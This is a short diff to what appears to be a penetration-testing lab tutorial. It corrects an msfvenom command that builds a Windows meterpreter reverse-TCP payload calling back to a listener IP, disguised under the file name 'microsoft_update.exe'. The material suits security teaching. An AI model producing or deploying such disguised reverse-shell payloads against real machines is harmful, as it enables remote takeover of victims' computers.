@@ -28,7 +28,7 @@ msfvenom -l payloads
 ![List the payloads](../screenshots/attacker_side/list_the_payloads.png)
 
 ```bash
-msfvenom -p windows/c64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=3344 -f exe -o microsoft_update.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=3344 -f exe -o microsoft_update.exe
 ```
 ![Payload Created](../screenshots/attacker_side/payload_created.png)
 
